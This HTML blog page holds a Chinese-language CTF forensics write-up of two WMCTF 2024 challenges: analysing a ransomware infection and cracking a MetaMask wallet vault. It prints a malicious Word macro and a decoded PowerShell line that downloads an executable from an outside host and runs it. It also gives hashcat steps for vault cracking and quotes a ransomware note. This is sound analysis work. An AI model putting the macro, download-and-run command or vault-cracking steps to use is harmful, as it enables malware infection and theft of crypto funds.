<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>WMCTF 2024 Forensics Writeup | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="WMCTF 2024 Forensics Writeup - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/wmctf-2024-forensics-writeup/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/wmctf-2024-forensics-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/wmctf-2024-forensics-writeup/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="WMCTF 2024 Forensics Writeup">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-09-11T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-09-11T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="WMCTF 2024 Forensics Writeup">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "https://z9nn8w.github.io/posts/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "WMCTF 2024 Forensics Writeup",
      "item": "https://z9nn8w.github.io/posts/ctf/wmctf-2024-forensics-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "WMCTF 2024 Forensics Writeup",
  "name": "WMCTF 2024 Forensics Writeup",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "Party Time 桌面上有个 Party invitation.docm ，dump下来一眼宏病毒，oletools可以查看宏的代码：\nPrivate Sub Document_Open() Dim p As DocumentProperty Dim decoded As String Dim byteArray() As Byte For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = \"Comments\" Then byteArray = test(p.Value) decoded = \"\" For i = LBound(byteArray) To UBound(byteArray) decoded = decoded \u0026 Chr(byteArray(i) Xor \u0026H64) Next i Shell (decoded) End If Next End Sub Function test(hexString As String) As Byte() Dim lenHex As Integer lenHex = Len(hexString) Dim byteArray() As Byte ReDim byteArray((lenHex \\ 2) - 1) Dim i As Integer Dim byteValue As Integer For i = 0 To lenHex - 1 Step 2 byteValue = Val(\"\u0026H\" \u0026 Mid(hexString, i + 1, 2)) byteArray(i \\ 2) = byteValue Next i test = byteArray End Function 分析一下可以知道是从 Comments 属性中获取字符串，与0x64异或后执行得到的shell代码，问了gpt，说是在 core.xml 里能找到 hexstring 内容：\n140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143 s = \"140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143\" shell = \"\" for i in range(0,len(s),2): shell += chr(int(s[i:i+2],base=16) ^ 0x64) print (shell) 运行结果为powershell恶意脚本，会下载恶意程序放到 $env:temp 目录下并执行：\npowershell.exe -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.207.1:8080/windows_update_20240813.exe',$env:temp+'/windows_update_20240813.exe');Start-Process $env:temp'/windows_update_20240813.exe' 用FTK Imager挂载ad1文件，在Temp目录下找到 windows_update_20240813.exe ，放到云沙箱里说是有释放文件，在桌面上可以找到 readme.txt 和 flag.rar ，先看看 readme.txt 文件内容：\nHi, since you are reading this it means you have been hacked. In addition to encrypting your files, deleting backups, we also downloaded confidential information. Here's what you shouldn't do: 1) Contact the police, fbi or other authorities before the end of our deal 2) Contact the recovery company so that they would conduct dialogues with us. (This can slow down the recovery, and generally put our communication to naught) 3) Do not try to decrypt the files yourself!!! This can lead to the impossibility of their decryption. 4) Keep us for fools) We will also stop any communication with you, and continue DDoS, calls to employees and business partners. In a few weeks, we will simply repeat our attack and delete all your data from your networks, WHICH WILL LEAD TO THEIR UNAVAILABILITY! Here's what you should do right after reading it: 1) If you are an ordinary employee, send our message to the CEO of the company, as well as to the IT department 2) If you are a CEO, or a specialist in the IT department, or another person who has weight in the company, you should contact us within 24 hours by email. We are ready to confirm all our intentions regarding DDOS, calls, and deletion of the date at your first request. Mails to contact us: weary_meadow@163.com flag.rar 就是勒索软件加密的文件，考虑逆向获取加密逻辑：\n可以看到在注册表里存放了RSA的密钥，具体看看函数的话可以知道公私钥都在注册表里，并且还有一个Devicekey，值为hostname的sha256值，最终实现了一个RSA-OAEP Encrypt的操作：\n赛后重新搞了一下python环境的volatility2，发现可以跑出profile来，先查注册表里的key：\n$ python2 vol.py -f 1.raw --profile=Win10x64_19041 printkey -K \"SOFTWARE\\nothing\" 只需提出privatekey用于解密：\n-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA0WudoQ2mgYalJ2LKLzxeqVydTdteAQkdllvhu/jh7+pCTvUJ uNMJEdSFphVAIp53BBuGVp0xwSav8hbffHX+Fdn7ZRN0YecgDtPA3Pd3y9jcutVZ yes8Wjbpt6qTD+ITl1nPsKqsB2Ry1BhFYWBC8+2YniKQqb4UE3Kr7LE78Tb8ABp9 epe4AMguNHlgdC97DpJ5R7/esRjMey/NWdFXN1LsQYCn9/UGwVhLG3gmPn200XE6 KLjXRijrN23lwpDw88J7pfJCbfh/jgpoe91Rmq/ADs4mwhXcNRafmsNixCj/Zwcr 3ANPuTNOKmH6IaPWg410O+1q2noV67cLi/NrIQIDAQABAoIBAQCuljT3S1YArauJ xkYgUwfn0Zoiijs4Sc0syLTL7JUPWhClmorcVrM89hvlddneApXeCsRX+Py9te8A uCjgrc2BkhSPE0T3SaPkOIyUqopomwaJi8wrFb1eyGDYCZBIsYT7rJgFBIQeNZO1 VfahU4r9qJqPWumXWSuLexHxZWA/msByzrijZIP5ufeuIzCNLV6yOPOhSMIHCA3s hOjOQsW76q+fVIGAR8qHFj/Ee02ta4engXEhBWa5Y7pLqtihHdZIcn0KRxx3+Ev5 kJhBMIPazdneQ/KiP5wzkdSYoTf9+hLjYGQu6A3T2GqzrOvlsd6gNfq/WlrKzIa6 P7wqXhhBAoGBANmHWpnPUZvR0LXLMi8n+zE7FWhtVI5eZltpVou1XefYt6/LZLv9 /pSQCZRRwqUQTjFWOKcg+H2rRdKVc7h/fySXDlmUkE9Ep4REqAAMEGRQKRUJrq2D KiNq7E08dZpoAiaH4PaZKMsuubxpJX3WSTkLVXnusN0TObCibjnKk2mdAoGBAPZ1 J6roXjv6f4N3+i/aUUh/UaGlJuhqyi8ALiI7+9dIVrKyU8ULjjnlb3F8Mg4n8FQb AxTAnN9HvDBYLwwWo48yD7zzNPlxwF3rEiUuZ8BjUGMuN1QIPT0wSDvKjOdOoQFB HkNu/Ysjfp4paET0foYRzu62eAzh9mAegM9PHKJVAoGASudf3EzWViiGjML+cdx7 k7U7puzWy/tXlayNH6iBQH+QqNkJw+4vRqrekZMhykL2GekNswcYafWbImtSILrO ZiQZzeDpXFJQuKwHiZSd5Fzx+IuP+bGLxgxgeCwUdunPq8LoRSHyORzK2kT+ovkx 15G+ijEV99pR6C/WctH9tsUCgYAVlP7LRZvy7qW58oizJhAWJCgW2qqEkc1wvjhM ASq1mH0XGuyhBbkHsuLGclTDzpWKF+92IsPZ/aMqLJ66FUVvZbfhGP8blO1+i/ZD 0UN+onPIq6RmtG4AbLj2m28pVkZdIMGwsAh95bbRzNh3qV1nCiov10S+BA+aLTGk dc4RHQKBgBPT6/JmHGe6MqbEfnu7H0FyubseQ5B5bsWrw9xX0gVwjDV6iiTnqLT0 lD5qVyb4nGAcaqn7Wm3Hoykom6x7CnueBHY7HHGq21bvTOQv/aC59mZxpPaDEMUR eROsDq1jsfYVTBwpUDoWP7yRAv5tiUHU0BtjwlozyfvgJOIpjTMg -----END RSA PRIVATE KEY----- 再可以从环境变量里找到hostname，结果里很多都有主机名：\n$ python2 vol.py -f 1.raw --profile=Win10x64_19041 envars ... 6488 conhost.exe 0x00000239b11d0fe0 USERDOMAIN DESKTOP-8KRF7H0 6488 conhost.exe 0x00000239b11d0fe0 USERDOMAIN_ROAMINGPROFILE DESKTOP-8KRF7H0 ... 原勒索软件是Go语言编写的，python的RSA-OAEP好像解不出原文件：\npackage main import ( \"crypto/rand\" \"crypto/rsa\" \"crypto/sha256\" \"crypto/x509\" \"encoding/pem\" \"fmt\" \"io/ioutil\" \"log\" ) var hostname = \"DESKTOP-8KRF7H0\" func main() { //read and parse key privateKeyFile, err := ioutil.ReadFile(\"RSAprivatekey.pem\") if err != nil { log.Fatalf(\"Read RSAprivatekey file Error: %v\", err) } block, _ := pem.Decode(privateKeyFile) if block == nil || block.Type != \"RSA PRIVATE KEY\" { log.Fatalf(\"Decode RSAprivatekey file Error:%v\", err) } RSAprivateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes) if err != nil { log.Fatalf(\"Parse RSAprivatekey file Error: %v\", err) } encryptedFile, err := ioutil.ReadFile(\"flag.rar\") if err != nil { log.Fatalf(\"Read encrypted file Error: %v\", err) } //RSA OAEP and SHA-256 devicekey := sha256.Sum256([]byte(hostname)) label := devicekey[:] hash := sha256.New() decryptedFile, err := rsa.DecryptOAEP(hash, rand.Reader, RSAprivateKey, encryptedFile, label) if err != nil { log.Fatalf(\"RSADecryptOAEP Error: %v\", err) } err = ioutil.WriteFile(\"output.rar\", decryptedFile, 0666) if err != nil { log.Fatalf(\"Write decrypted file Error: %v\", err) } fmt.Println(\"Decrypt encrypted file successfully\") } 最后得到的 out.rar 可以正常解压拿到flag：\nWMCTF{dae66e1b-a0e7-4744-ade3-f5a5b4a95c09} metasecret 复现的时候找到一篇文章，感觉也挺有参考价值的，是关于Google插件中小狐狸钱包助记词恢复的：https://zgao.top/metamask%E4%BB%8E%E6%8F%92%E4%BB%B6%E6%96%87%E4%BB%B6%E4%B8%AD%E6%81%A2%E5%A4%8D%E5%8A%A9%E8%AE%B0%E8%AF%8D/\n附件为ad1文件，使用FTK Imager挂载\n在Firefox中，需要找到idb文件进而获取MetaMask的vault，可以结合着修改日期来找，发现idb文件位于目录G:\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\jawk8d8g.default-release\\storage\\default\\moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId=4294967295\\idb\\3647222921wleabcEoxlt-eengsairo.files下，文件名称为492\n可以010 Editor硬搜 keyMetadata ，然后从里面找出vault：\n{\"data\":\"WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ==\",\"iv\":\"fPymLoml7KKyZ5wdqwylqg==\",\"keyMetadata\":{\"algorithm\":\"PBKDF2\",\"params\":{\"iterations\":600000}},\"salt\":\"xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=\"} 用meta2hashcat转成hashcat支持的格式：\npython metamask2hashcat.py --vault wallet | tee wallet.hash $metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=$fPymLoml7KKyZ5wdqwylqg==$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ== 不过注意由于metamask变更过几次钱包的加密算法，所以需要在github下载导入hashcat的modules模块：\nhttps://github.com/flyinginsect271/MetamaskHashcatModule/blob/main/module-26650-win-linux.zip kali下可以将 .so 文件导入目录/usr/share/hashcat/modules，同时可以在磁盘目录文档中找到passwords.txt，进行hashcat爆破，过程中遇到了两个问题：\n第一个是无法识别hash文件格式，windows下可能需要用notepad打开 wallet.hash ，另存为utf-8编码格式\n第二个是在爆破时报内存不足：hashcat Device #1: Not enough allocatable device memory for this attack.，增加虚拟机的内存即可，我从2G加到了4G\n根据hashcat的提示，爆破完后还需要用以下命令才能看到password：\n$ hashcat -a 0 -m 26650 wallet.hash passwords.txt --show $metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=$fPymLoml7KKyZ5wdqwylqg==$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ==:silversi 拿到password之后可以去官网解这个vault拿到私钥助记词：\nacid happy olive slim crane avoid there cave umbrella connect rain vessel 重置密码的时候小狐狸钱包一直在转圈，不知道怎么回事，打算用非预期解法，从Firefox缓存入手：\n可以看到不少url里都有web3mq，这是一个Web3的社交应用，结合前面的metamask，可以想到应该在这上面有过聊天记录，可以直接找 /messages/history ，再到 entries 目录下找到对应的 cache name ：\nFirefox使用 Brotli 压缩来优化缓存，所以把对应文件的前面一小段base64编码后在线网站解压缩即可拿到聊天记录：\n{\"msg\":\"Ok\",\"code\":0,\"data\":{\"result\":[{\"cipher_suite\":\"NONE\",\"from\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"from_sign\":\"L2uZmWFwNvh/XcMKET1Y60MntEQTBfZHzL/ajlP3czOKzi2Y7RdwAzZuz9UwKENSLlcH2Ym9bRmHVkTBksynAA==\",\"message_status\":{},\"messageid\":\"ecc2379ad6f01ec8376d6c9655b46a4f3cd686c23dc1756ed9637ec2\",\"payload\":\"Z29vZA==\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371760065,\"topic\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"from_sign\":\"LA/24PvEbe1jxV24bF5QBvvoeb89hzjZPaNZLiwBnStYrMpJSkkkWEc5K0XkX5vDhLagMh7OuaGrl7ImoN4uBQ==\",\"message_status\":{},\"messageid\":\"3a2d4cb900bc16c319e1e9ac2fc9cda2d749ea9f6898ebaba0133802\",\"payload\":\"V01DVEZ7YWFhMzViYTItMDQxYy00YWVjLTk0MzYtY2UzYTJhZDFjNzM0fQ==\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371722987,\"topic\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"from_sign\":\"kDCiK+0w6gcur7OZRTZQSKNU9cEA04RhLmi8v5GhH6zAo6TUQzvhvQ8Z2zi/dh3D8BdKXdQmc2HOEK9MTV7aBQ==\",\"message_status\":{},\"messageid\":\"d47b782dc38c2002cbd5000b14ddb7ba21c4883be92d6b9942a08649\",\"payload\":\"VGhhbmsgeW91LCB0aGlzIGlzIHlvdXIgZmxhZy4=\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371673089,\"topic\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"from_sign\":\"DLSkIXdyfUo1EY9QFdp7jHrYL9HhXuI+lOS6exqklgvAnTFmlHNRl4vk1hlTASnAKNyg2b9SJOklEXPl+AxdDA==\",\"message_status\":{},\"messageid\":\"16c6ef4e0d5b83def0c2d9e406b154ad044ef67601570796b3c20465\",\"payload\":\"aSdsbCB0YWtlIGl0\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371628519,\"topic\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"from_sign\":\"EsfXRObp/043zRJ313zDi3zofTTKGnKHasiDOCGgyB3Hc8J9nut3S8ZPb8/KyjR7EPDSt0ugsCvEzx6grXxYBg==\",\"message_status\":{},\"messageid\":\"43a57138b5c364f32fe5ee2ef046b9645c9851cce080e75e03a5c392\",\"payload\":\"ZW1tbW0sIG9rYXk=\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371618534,\"topic\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"from_sign\":\"QfqCvxmhBvy5a5yEP6DRe0C+cV/IVUA9Kh+npDo1RsmiVd0jIEFG1FX15684ODAnFELhr40gIO5dER2/6tcMBg==\",\"message_status\":{},\"messageid\":\"8dc377d950eebf6f4fe712d75a89bc8f70d894e4fd39eea931910b32\",\"payload\":\"c3VyZSwgdiBtZSA1MGJ0YyBmb3Igb25lIGZsYWc=\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371554406,\"topic\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"from_sign\":\"MyAt7xuoYAs+7ie8NgwePsQEDt4ivonO4KOpW/5Mcz4HtDh8RxEXoQy4gN5Wq9WOO+kQ6FICpkI59H+lAm6SCw==\",\"message_status\":{},\"messageid\":\"fc12125fed349389c6cde1e340fadaf32f8202c1b55040b8637ae3e4\",\"payload\":\"aSdtIGZyb20gWElBTllVLCB5b3Ugc2F5IHlvdSBoYXZlIGZsYWdzIGZvciBXTUNURiwgaXMgaXQgcmVhbD8=\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371497684,\"topic\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"from_sign\":\"T1bIBWnO/htVa8Ud2HFeqrQYeJrw0wpxLkLN2BAsoT4/g0/LWzJOwLEn04H6B1pCjZKgN/ZR47SvQNhWYAENDQ==\",\"message_status\":{},\"messageid\":\"af9ebc306bc64ce753ab97a1932576992bf05d4748d519a1df772d0f\",\"payload\":\"SGVsbG8uIENhbiBJIGhlbHAgeW91Pw==\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371341771,\"topic\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"version\":0},{\"cipher_suite\":\"NONE\",\"from\":\"user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb\",\"from_sign\":\"lgvVImaXV0yoZ/DuTqfKsH4rWbTUDhaHrZ6q+0wZ52/VO+ew4zgmM3kz+TDFU+k/nSbVvI85m0FQmHUUsD3bBg==\",\"message_status\":{},\"messageid\":\"5c54e800ae8c47b614ea8eb7c2b75cf5169ef606596a409c2da447fb\",\"payload\":\"aGk=\",\"payload_type\":\"text/plain; charset=utf-8\",\"replyid\":\"\",\"threadid\":\"\",\"timestamp\":1721371219728,\"topic\":\"user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a\",\"version\":0}],\"total\":9}} payload 即为聊天内容，不过被base64编码过了，根据 timestamp 解一下就能拿到完整的聊天记录：\nHello. Can I help you? i'm from XIANYU, you say you have flags for WMCTF, is it real? sure, v me 50btc for one flag emmmm, okay i'll take it Thank you, this is your flag. WMCTF{aaa35ba2-041c-4aec-9436-ce3a2ad1c734} good ",
  "wordCount" : "2227",
  "inLanguage": "en",
  "datePublished": "2024-09-11T00:00:00Z",
  "dateModified": "2024-09-11T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/ctf/wmctf-2024-forensics-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      WMCTF 2024 Forensics Writeup
    </h1>
    <div class="post-meta"><span title='2024-09-11 00:00:00 +0000 UTC'>September 11, 2024</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#party-time" aria-label="Party Time">Party Time</a></li>
                    <li>
                        <a href="#metasecret" aria-label="metasecret">metasecret</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
